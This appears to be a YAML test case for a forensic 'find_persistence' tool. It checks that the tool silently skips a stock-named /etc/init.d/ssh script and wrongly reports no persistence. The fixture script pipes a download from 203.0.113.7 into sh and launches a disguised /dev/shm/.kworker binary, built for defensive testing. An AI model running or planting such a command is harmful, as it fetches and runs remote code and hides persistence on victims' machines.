# Matrix case P4117-002: find_persistence skips /etc/init.d scripts whose name
# is in the stock list without reading them and does not say so.
case_id: P4117-002
problem: P4117
server: findevil
variant: findevil-d1a8d25
commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
display: response
level: mcp
realism: possible
coverage: full
summary: An /etc/init.d/ssh script that downloads and runs a payload from /dev/shm is never read because its name is on the stock list, and the scan reports "No persistence mechanisms found" without mentioning the skipped scripts.
fixture:
  - path: fs/etc/init.d/ssh
    text: |
      #!/bin/sh
      curl -s http://203.0.113.7/k | sh
      exec /dev/shm/.kworker &
steps:
  - tool: find_persistence
    args:
      root_path: ${EVIDENCE}/fs
expect:
  - step: 1
    contains: "No persistence mechanisms found"
  - step: 1
    not_regex: "(?i)init\\.d|skipp|stock"
